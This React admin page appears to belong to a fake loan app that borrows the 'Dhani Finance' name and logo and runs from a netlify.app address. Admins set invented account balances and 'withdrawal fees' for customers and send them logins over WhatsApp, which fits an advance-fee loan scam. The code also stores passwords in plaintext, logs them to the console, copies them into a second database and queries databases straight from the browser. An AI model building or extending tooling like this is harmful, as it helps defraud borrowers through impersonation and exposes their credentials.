import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "@/contexts/AuthContext";
import { User } from "@/types";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "@/hooks/use-toast";
import { userDb, dataDb } from "@/lib/neon";
import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription, AlertDialogAction, AlertDialogCancel, AlertDialogFooter } from "@/components/ui/alert-dialog";
import { CurrencyInput } from "@/components/ui/CurrencyInput";
import { BankCombobox } from "@/components/ui/BankCombobox";
import { banks } from "@/data/banks";
import { Eye, EyeOff } from "lucide-react";

// --- UTILITY FUNCTIONS ---
const formatIndianCurrency = (num: number) => {
  if (typeof num !== 'number' || isNaN(num)) { return '₹ 0'; }
  const formattedNumber = new Intl.NumberFormat('en-IN', { minimumFractionDigits: 0, maximumFractionDigits: 2 }).format(num);
  return `₹ ${formattedNumber}`;
};

function toWords(num: number): string {
  const ones = ['', 'one', 'two', 'three', 'four', 'five', 'six', 'seven', 'eight', 'nine', 'ten', 'eleven', 'twelve', 'thirteen', 'fourteen', 'fifteen', 'sixteen', 'seventeen', 'eighteen', 'nineteen'];
  const tens = ['', '', 'twenty', 'thirty', 'forty', 'fifty', 'sixty', 'seventy', 'eighty', 'ninety'];
  if (num < 20) return ones[num];
  if (num < 100) return tens[Math.floor(num / 10)] + (num % 10 !== 0 ? ' ' + ones[num % 10] : '');
  return '';
}

function numberToWordsIndian(num: number): string {
  if (typeof num !== 'number' || isNaN(num) || num < 0) return '';
  if (num === 0) return 'Zero rupees only';
  let words = '';
  if (num >= 10000000) { words += toWords(Math.floor(num / 10000000)) + ' crore '; num %= 10000000; }
  if (num >= 100000) { words += toWords(Math.floor(num / 100000)) + ' lakh '; num %= 100000; }
  if (num >= 1000) { words += toWords(Math.floor(num / 1000)) + ' thousand '; num %= 1000; }
  if (num >= 100) { words += toWords(Math.floor(num / 100)) + ' hundred '; num %= 100; }
  if (num > 0) { if (words !== '') words += 'and '; words += toWords(num); }
  const finalWords = words.trim();
  return finalWords.charAt(0).toUpperCase() + finalWords.slice(1) + ' rupees only';
}
// --- END UTILITY FUNCTIONS ---

const Admin = () => {
  const navigate = useNavigate();
  const { isAdmin, logout, isLoading } = useAuth();
  const [users, setUsers] = useState<User[]>([]);
  const [loading, setLoading] = useState(true);
  const [editingUser, setEditingUser] = useState<User | null>(null);
  const [manualBankName, setManualBankName] = useState("");
  const [manualBankNameToEdit, setManualBankNameToEdit] = useState("");
  const [showNewPassword, setShowNewPassword] = useState(true);
  const [showEditPassword, setShowEditPassword] = useState(false);
  const [showAllUsers, setShowAllUsers] = useState(false);
  const [isCreating, setIsCreating] = useState(false);

  const [newUser, setNewUser] = useState({
    userId: "", password: "", accountName: "", accountNumber: "82855296984261",
    accountType: "Loan Account", availableBalance: 500000, bankName: "",
    withdrawAccountNumber: "", withdrawalFee: 1400,
  });

  useEffect(() => {
    if (!isLoading && !isAdmin) {
      navigate("/");
      toast({ title: "Access Denied", description: "You don't have permission to access the admin dashboard.", variant: "destructive" });
    } else if (!isLoading && isAdmin) {
      fetchUsers();
    }
  }, [isAdmin, isLoading, navigate]);

  useEffect(() => {
    if (editingUser) {
      const isBankInList = banks.some(bank => bank.value === editingUser.bankName);
      if (isBankInList) {
        setManualBankNameToEdit("");
      } else {
        const originalBankName = editingUser.bankName;
        setEditingUser(prev => prev ? { ...prev, bankName: "Others" } : null);
        setManualBankNameToEdit(originalBankName);
      }
    }
  }, [editingUser?.id]);

  const fetchUsers = async () => {
    try {
      setLoading(true);
      const data = await userDb`SELECT * FROM users ORDER BY created_at DESC`;
      const mappedUsers = (data || []).map((user: any) => ({
        id: user.id || "", userId: user.user_id || "", password: user.password || "",
        accountName: user.account_name || "", accountNumber: user.account_number || "",
        accountType: user.account_type || "Loan Account", availableBalance: Number(user.available_balance) || 0,
        bankName: user.bank_name || "", withdrawAccountNumber: user.withdraw_account_number || "",
        withdrawalFee: Number(user.withdrawal_fee) || 0, initialDeposit: 0, transactions: user.transactions || []
      }));
      setUsers(mappedUsers);
    } catch (error) {
      console.error("Error fetching users:", error);
      toast({ title: "Error", description: "Failed to fetch users.", variant: "destructive" });
    } finally { setLoading(false); }
  };

  const handleShare = (user: User) => {
    const baseUrl = "https://dhani-finance-mobile-3.netlify.app";
    const message = `${baseUrl}\n\n*Login Details:*\n*User ID:* ${user.userId}\n*Password:* ${user.password}\n\n_Sent via Dhani Finance App by KoS_`;
    const encodedMessage = encodeURIComponent(message);
    const whatsappUrl = `https://api.whatsapp.com/send?text=${encodedMessage}`;
    window.open(whatsappUrl, '_blank');
    toast({ title: "Ready to Share", description: "WhatsApp has been opened in a new tab." });
  };

  const handleCreateUser = async () => {
    if (isCreating) return;
    try {
      setIsCreating(true);
      console.log('[CREATE] Step 1: Button clicked, starting validation...');

      if (!newUser.userId || !newUser.password || !newUser.accountName || !newUser.accountNumber) {
        console.warn('[CREATE] STOPPED: Missing required fields', { userId: newUser.userId, password: newUser.password, accountName: newUser.accountName, accountNumber: newUser.accountNumber });
        toast({ title: "Validation Error", description: "Please fill in all required fields.", variant: "destructive" });
        return;
      }

      const bankNameToSave = newUser.bankName === "Others" ? manualBankName : newUser.bankName;
      if (!bankNameToSave) {
        console.warn('[CREATE] STOPPED: No bank selected');
        toast({ title: "Validation Error", description: "Please select a bank name.", variant: "destructive" });
        return;
      }

      console.log('[CREATE] Step 2: Checking for existing user in userDb...');
      const existingUser = await userDb`SELECT user_id FROM users WHERE user_id = ${newUser.userId} LIMIT 1`;
      if (existingUser && existingUser.length > 0) {
        console.warn('[CREATE] STOPPED: User ID already exists');
        toast({ title: "Error", description: "A user with this User ID already exists.", variant: "destructive" });
        return;
      }

      console.log('[CREATE] Step 3: Inserting into userDb (users table)...');
      await userDb`
        INSERT INTO users (user_id, password, account_name, account_number, account_type, available_balance, bank_name, withdraw_account_number, withdrawal_fee)
        VALUES (${newUser.userId}, ${newUser.password}, ${newUser.accountName}, ${newUser.accountNumber}, ${newUser.accountType}, ${newUser.availableBalance}, ${bankNameToSave}, ${newUser.withdrawAccountNumber}, ${newUser.withdrawalFee})
      `;
      console.log('[CREATE] Step 3: ✅ Inserted into userDb successfully');

      // Mirror the new user to the online_app table in the data backup DB
      console.log('[CREATE] Step 4: Mirroring to dataDb (online_app table)...');
      try {
        await dataDb`
          INSERT INTO online_app (
            user_id, password, account_name, bank_name,
            bank_amount, withdraw_account_number, available_balance, withdrawal_fee
          ) VALUES (
            ${newUser.userId},
            ${newUser.password},
            ${newUser.accountName},
            ${bankNameToSave},
            ${String(newUser.availableBalance)},
            ${newUser.withdrawAccountNumber},
            ${String(newUser.availableBalance)},
            ${String(newUser.withdrawalFee)}
          )
        `;
        console.log('[CREATE] Step 4: ✅ Mirrored to online_app successfully');
      } catch (neonErr) {
        console.warn('[CREATE] Step 4: ⚠️ Could not mirror to online_app (non-fatal):', neonErr);
      }

      console.log('[CREATE] Step 5: Showing success toast and resetting form...');
      toast({ title: "Success", description: "User created successfully." });
      setNewUser({
        userId: "", password: "", accountName: "", accountNumber: "82855296984261",
        accountType: "Loan Account", availableBalance: 500000, bankName: "",
        withdrawAccountNumber: "", withdrawalFee: 1400,
      });
      setManualBankName("");
      await fetchUsers();
    } catch (error) {
      console.error("[CREATE] ❌ OUTER ERROR:", error);
      toast({ title: "Error", description: (error as Error).message || "Failed to create user.", variant: "destructive" });
    } finally {
      setIsCreating(false);
    }
  };

  const handleEditUser = (user: User) => setEditingUser({ ...user });

  const handleUpdateUser = async () => {
    if (!editingUser) return;
    try {
      const bankNameToSave = editingUser.bankName === "Others" ? manualBankNameToEdit : editingUser.bankName;
      if (!bankNameToSave) {
        toast({ title: "Validation Error", description: "Please select a bank name.", variant: "destructive" });
        return;
      }

      const { id, ...userData } = editingUser;
      await userDb`
        UPDATE users
        SET user_id = ${userData.userId}, password = ${userData.password}, account_name = ${userData.accountName}, 
            account_number = ${userData.accountNumber}, account_type = ${userData.accountType}, 
            available_balance = ${Number(userData.availableBalance)}, bank_name = ${bankNameToSave}, 
            withdraw_account_number = ${userData.withdrawAccountNumber}, withdrawal_fee = ${Number(userData.withdrawalFee)}
        WHERE id = ${id}
      `;
      toast({ title: "Success", description: "User updated successfully." });
      setEditingUser(null);
      setManualBankNameToEdit("");
      fetchUsers();
    } catch (error) {
      console.error("Error updating user:", error);
      toast({ title: "Error", description: (error as Error).message || "Failed to update user.", variant: "destructive" });
    }
  };

  const handleDeleteUser = async (id: string) => {
    try {
      await userDb`DELETE FROM users WHERE id = ${id}`;
      toast({ title: "Success", description: "User deleted successfully." });
      fetchUsers();
    } catch (error) {
      console.error("Error deleting user:", error);
      toast({ title: "Error", description: (error as Error).message || "Failed to delete user.", variant: "destructive" });
    }
  };

  if (loading) return <div className="min-h-screen flex items-center justify-center bg-gray-50 text-primary font-medium">Loading admin dashboard...</div>;

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col items-center p-4 antialiased">
      <div className="w-full max-w-7xl mx-auto space-y-8">
        <div className="flex flex-col sm:flex-row items-center justify-between bg-white p-6 rounded-2xl shadow-sm border border-gray-100">
          <img src="/assets/images/dmi_dhani_logo.png" alt="Dhani Finance Logo" className="h-10 sm:h-12 w-auto object-contain mb-4 sm:mb-0 drop-shadow-sm" />
          <h1 className="text-2xl sm:text-3xl font-bold text-primary text-center sm:text-left">Admin Dashboard</h1>
          <Button onClick={logout} className="bg-primary hover:bg-primary/90 text-white font-semibold w-full sm:w-auto mt-4 sm:mt-0 rounded-xl px-8 shadow-sm">Logout</Button>
        </div>

        <Card className="p-6 sm:p-8 bg-white shadow-lg border border-gray-100 rounded-3xl">
          <h2 className="text-xl sm:text-2xl font-bold mb-6 text-primary border-b border-gray-100 pb-4">Create New User</h2>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-8">
            <div className="space-y-2">
              <Label htmlFor="new-userId" className="text-gray-700 font-medium ml-1">Customer Mobile Number</Label>
              <Input id="new-userId" type="text" value={newUser.userId} onChange={(e) => setNewUser({ ...newUser, userId: e.target.value })} placeholder="Customer Mobile Number" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400" />
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-password" className="text-gray-700 font-medium ml-1">Password</Label>
              <div className="relative">
                <Input id="new-password" type={showNewPassword ? "text" : "password"} value={newUser.password} onChange={(e) => setNewUser({ ...newUser, password: e.target.value })} placeholder="Password" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400 pr-10" />
                <Button type="button" variant="ghost" size="icon" className="absolute inset-y-0 right-0 h-full px-3 text-gray-400 hover:text-primary hover:bg-transparent rounded-r-xl" onClick={() => setShowNewPassword(prev => !prev)}>
                  {showNewPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </Button>
              </div>
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-accountName" className="text-gray-700 font-medium ml-1">Account Name</Label>
              <Input id="new-accountName" type="text" value={newUser.accountName} onChange={(e) => setNewUser({ ...newUser, accountName: e.target.value })} placeholder="Account Name" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400" />
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-accountNumber" className="text-gray-700 font-medium ml-1">Account Number</Label>
              <Input id="new-accountNumber" type="text" value={newUser.accountNumber} onChange={(e) => setNewUser({ ...newUser, accountNumber: e.target.value })} placeholder="Account Number" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400" />
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-accountType" className="text-gray-700 font-medium ml-1">Account Type</Label>
              <Input id="new-accountType" type="text" value={newUser.accountType} onChange={(e) => setNewUser({ ...newUser, accountType: e.target.value })} placeholder="Account Type" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400" />
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-bankName" className="text-gray-700 font-medium ml-1">Bank Name</Label>
              <BankCombobox value={newUser.bankName} onValueChange={(value) => { setNewUser({ ...newUser, bankName: value }); if (value !== 'Others') { setManualBankName(""); } }} />
              {newUser.bankName === 'Others' && (
                <div className="mt-3">
                  <Label htmlFor="manual-bankName" className="text-gray-500 text-xs font-semibold ml-1 uppercase tracking-wider mb-1 block">Please Specify Bank Name</Label>
                  <Input id="manual-bankName" value={manualBankName} onChange={(e) => setManualBankName(e.target.value)} placeholder="Enter Bank Name" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400" />
                </div>
              )}
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-withdrawAccountNumber" className="text-gray-700 font-medium ml-1">Withdraw Account Number</Label>
              <Input id="new-withdrawAccountNumber" type="text" value={newUser.withdrawAccountNumber} onChange={(e) => setNewUser({ ...newUser, withdrawAccountNumber: e.target.value })} placeholder="Last 4 digit of account number" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400" />
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-availableBalance" className="text-gray-700 font-medium ml-1">Available Balance Amount</Label>
              <CurrencyInput id="new-availableBalance" value={newUser.availableBalance} onValueChange={(value) => setNewUser({ ...newUser, availableBalance: value })} placeholder="₹ 0" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400 font-semibold" />
              <p className="text-xs text-primary font-medium mt-1.5 ml-1 h-4">{numberToWordsIndian(newUser.availableBalance)}</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="new-withdrawalFee" className="text-gray-700 font-medium ml-1">Withdrawal Fee Amount</Label>
              <CurrencyInput id="new-withdrawalFee" value={newUser.withdrawalFee} onValueChange={(value) => setNewUser({ ...newUser, withdrawalFee: value })} placeholder="₹ 0" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400 font-semibold" />
              <p className="text-xs text-primary font-medium mt-1.5 ml-1 h-4">{numberToWordsIndian(newUser.withdrawalFee)}</p>
            </div>
          </div>
          <Button onClick={handleCreateUser} disabled={isCreating} className="w-full sm:w-auto px-10 h-12 bg-success hover:bg-success/90 text-white font-semibold text-lg rounded-xl shadow-md transition-all active:scale-[0.98] disabled:opacity-70 disabled:cursor-not-allowed">
            {isCreating ? (
              <><span className="animate-spin mr-2 inline-block h-4 w-4 border-2 border-white border-t-transparent rounded-full"></span>Creating...</>
            ) : "Create User"}
          </Button>
        </Card>

        <Card className="p-6 sm:p-8 bg-white shadow-lg border border-gray-100 rounded-3xl">
          <h2 className="text-xl sm:text-2xl font-bold mb-6 text-primary border-b border-gray-100 pb-4">Existing Users</h2>
          <div className="overflow-x-auto rounded-xl border border-gray-100 shadow-sm">
            <table className="min-w-full bg-white text-gray-700 border-collapse">
              <thead className="bg-gray-50 text-gray-500 font-semibold text-sm">
                <tr>
                  <th className="py-4 px-6 border-b border-gray-100 text-left uppercase tracking-wider">User ID</th>
                  <th className="py-4 px-6 border-b border-gray-100 text-left uppercase tracking-wider">Account Name</th>
                  <th className="py-4 px-6 border-b border-gray-100 text-left uppercase tracking-wider">Balance</th>
                  <th className="py-4 px-6 border-b border-gray-100 text-left uppercase tracking-wider">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {users.length > 0 ? (showAllUsers ? users : users.slice(0, 5)).map((user) => (
                  <tr key={user.id} className="hover:bg-gray-50/50 transition-colors">
                    <td className="py-4 px-6 font-medium text-gray-900">{user.userId}</td>
                    <td className="py-4 px-6">{user.accountName}</td>
                    <td className="py-4 px-6">
                      <div className="font-semibold text-success">{formatIndianCurrency(user.availableBalance)}</div>
                      <div className="text-xs text-gray-500 font-medium mt-1">{numberToWordsIndian(user.availableBalance)}</div>
                    </td>
                    <td className="py-4 px-6 flex flex-col sm:flex-row gap-2">
                      <Button onClick={() => handleShare(user)} className="bg-success hover:bg-success/90 text-white w-full sm:w-auto shadow-sm rounded-lg">Share</Button>
                      <Button onClick={() => handleEditUser(user)} className="bg-primary hover:bg-primary/90 text-white w-full sm:w-auto shadow-sm rounded-lg">Edit</Button>
                      <Button onClick={() => handleDeleteUser(user.id)} className="bg-destructive hover:bg-destructive/90 text-white w-full sm:w-auto shadow-sm rounded-lg">Delete</Button>
                    </td>
                  </tr>
                )) : (<tr><td colSpan={4} className="py-8 text-center text-gray-500 font-medium bg-gray-50/50">No users found.</td></tr>)}
              </tbody>
            </table>
          </div>
          {!showAllUsers && users.length > 5 && (
            <div className="mt-6 flex justify-center">
              <Button onClick={() => setShowAllUsers(true)} variant="outline" className="border-primary text-primary hover:bg-primary/5 rounded-xl px-8">
                Show All Users ({users.length})
              </Button>
            </div>
          )}
          {showAllUsers && users.length > 5 && (
            <div className="mt-6 flex justify-center">
              <Button onClick={() => setShowAllUsers(false)} variant="outline" className="border-primary text-primary hover:bg-primary/5 rounded-xl px-8">
                Show Less
              </Button>
            </div>
          )}
        </Card>

        {editingUser && (
          <AlertDialog open={!!editingUser} onOpenChange={(isOpen) => { if (!isOpen) { setEditingUser(null); setShowEditPassword(false); } }}>
            <AlertDialogContent className="sm:max-w-xl max-h-[85vh] overflow-y-auto bg-white rounded-3xl shadow-2xl border-none">
              <AlertDialogHeader className="border-b border-gray-100 pb-4">
                <AlertDialogTitle className="text-2xl font-bold text-primary">Edit User</AlertDialogTitle>
                <AlertDialogDescription className="text-gray-500 font-medium">Update the user's details and click save when finished.</AlertDialogDescription>
              </AlertDialogHeader>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5 py-6">
                <div className="space-y-1.5">
                  <Label htmlFor="edit-userId" className="text-gray-700 font-medium ml-1">User ID</Label>
                  <Input id="edit-userId" value={editingUser.userId} onChange={(e) => setEditingUser({ ...editingUser, userId: e.target.value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20" />
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="edit-password" className="text-gray-700 font-medium ml-1">Password</Label>
                  <div className="relative">
                    <Input id="edit-password" type={showEditPassword ? "text" : "password"} value={editingUser.password} onChange={(e) => setEditingUser({ ...editingUser, password: e.target.value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 pr-10" />
                    <Button type="button" variant="ghost" size="icon" className="absolute inset-y-0 right-0 h-full px-3 text-gray-400 hover:text-primary hover:bg-transparent rounded-r-xl" onClick={() => setShowEditPassword(prev => !prev)}>
                      {showEditPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                    </Button>
                  </div>
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="edit-accountName" className="text-gray-700 font-medium ml-1">Account Name</Label>
                  <Input id="edit-accountName" value={editingUser.accountName} onChange={(e) => setEditingUser({ ...editingUser, accountName: e.target.value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20" />
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="edit-accountNumber" className="text-gray-700 font-medium ml-1">Account Number</Label>
                  <Input id="edit-accountNumber" value={editingUser.accountNumber} onChange={(e) => setEditingUser({ ...editingUser, accountNumber: e.target.value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20" />
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="edit-accountType" className="text-gray-700 font-medium ml-1">Account Type</Label>
                  <Input id="edit-accountType" value={editingUser.accountType} onChange={(e) => setEditingUser({ ...editingUser, accountType: e.target.value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20" />
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="edit-bankName" className="text-gray-700 font-medium ml-1">Bank Name</Label>
                  <BankCombobox value={editingUser.bankName} onValueChange={(value) => { setEditingUser({ ...editingUser, bankName: value }); if (value !== 'Others') { setManualBankNameToEdit(""); } }} />
                  {editingUser.bankName === 'Others' && (
                    <div className="mt-3">
                      <Label htmlFor="manual-bankName-edit" className="text-gray-500 text-xs font-semibold ml-1 uppercase tracking-wider mb-1 block">Specify Bank Name</Label>
                      <Input id="manual-bankName-edit" value={manualBankNameToEdit} onChange={(e) => setManualBankNameToEdit(e.target.value)} placeholder="Enter Bank Name" className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 placeholder:text-gray-400" />
                    </div>
                  )}
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="edit-withdrawAccountNumber" className="text-gray-700 font-medium ml-1">Withdraw Account Number</Label>
                  <Input id="edit-withdrawAccountNumber" value={editingUser.withdrawAccountNumber} onChange={(e) => setEditingUser({ ...editingUser, withdrawAccountNumber: e.target.value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20" />
                </div>
                <div className="space-y-1.5">
                  <Label htmlFor="edit-availableBalance" className="text-gray-700 font-medium ml-1">Available Balance</Label>
                  <CurrencyInput id="edit-availableBalance" value={editingUser.availableBalance} onValueChange={(value) => setEditingUser({ ...editingUser, availableBalance: value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 font-semibold" />
                  <p className="text-xs text-primary font-medium mt-1.5 ml-1 h-4">{numberToWordsIndian(editingUser.availableBalance)}</p>
                </div>
                <div className="md:col-span-2 space-y-1.5">
                  <Label htmlFor="edit-withdrawalFee" className="text-gray-700 font-medium ml-1">Withdrawal Fee</Label>
                  <CurrencyInput id="edit-withdrawalFee" value={editingUser.withdrawalFee} onValueChange={(value) => setEditingUser({ ...editingUser, withdrawalFee: value })} className="h-11 bg-gray-50 border-gray-200 text-gray-900 rounded-xl focus:bg-white focus:ring-2 focus:ring-primary/20 font-semibold" />
                  <p className="text-xs text-primary font-medium mt-1.5 ml-1 h-4">{numberToWordsIndian(editingUser.withdrawalFee)}</p>
                </div>
              </div>
              <AlertDialogFooter className="border-t border-gray-100 pt-4 sm:justify-end">
                <AlertDialogCancel onClick={() => setEditingUser(null)} className="h-11 bg-gray-100 text-gray-700 hover:bg-gray-200 border-none rounded-xl font-semibold px-6 sm:mb-0 mb-3">Cancel</AlertDialogCancel>
                <AlertDialogAction onClick={handleUpdateUser} className="h-11 bg-primary hover:bg-primary/90 text-white font-semibold rounded-xl px-8 shadow-sm">Save Changes</AlertDialogAction>
              </AlertDialogFooter>
            </AlertDialogContent>
          </AlertDialog>
        )}
      </div>
    </div>
  );
};

export default Admin;